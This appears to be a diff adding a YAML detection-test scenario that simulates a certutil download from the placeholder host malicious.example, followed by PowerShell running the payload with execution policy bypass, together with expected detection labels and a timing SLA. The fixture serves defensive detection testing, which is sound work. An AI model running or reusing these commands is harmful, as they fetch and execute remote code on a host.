@@ -1,0 +1,25 @@
+id: A2_lolbin_staging
+version: 1
+scenario: "LOLBIN certutil download + staging"
+tenant: demo
+stages:
+  - t: 0s
+    event_type: proc
+    id: a2-proc-1
+    host: hostC
+    parent: svchost.exe
+    child: cmd.exe
+    cmd: "cmd /c certutil -urlcache -split -f http://malicious.example/payload.bin payload.bin"
+  - t: 18s
+    event_type: proc
+    id: a2-proc-2
+    host: hostC
+    parent: cmd.exe
+    child: powershell.exe
+    cmd: "powershell -exec bypass -f payload.bin"
+labels:
+  expected_factors:
+    - lane_proc_parent_chain
+  optional_correlation: []
+sla:
+  first_detection_within: 30s
